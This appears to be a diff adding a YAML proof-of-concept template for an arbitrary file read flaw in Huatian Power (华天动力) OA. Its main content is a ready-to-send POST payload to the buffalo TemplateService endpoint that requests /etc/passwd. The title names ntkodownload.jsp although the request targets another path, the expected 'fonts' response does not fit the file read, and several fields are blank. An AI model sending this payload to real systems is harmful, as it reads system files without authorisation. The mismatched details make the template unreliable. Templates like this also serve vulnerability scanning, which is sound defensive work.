@@ -1,0 +1,24 @@
+id:
+
+info:
+  name: 华天动力OA ntkodownload.jsp 任意文件读取漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /OAapp/bfapp/buffalo/TemplateService
+  headers:
+    Content-Type: text/xml
+  data: |
+    <buffalo-call>
+    <method>getHtmlContent</method>
+    <string>/etc/passwd</string>
+    </buffalo-call>
+response1:
+  headers:
+  body: fonts
+  code:
+requests2:
+response2:
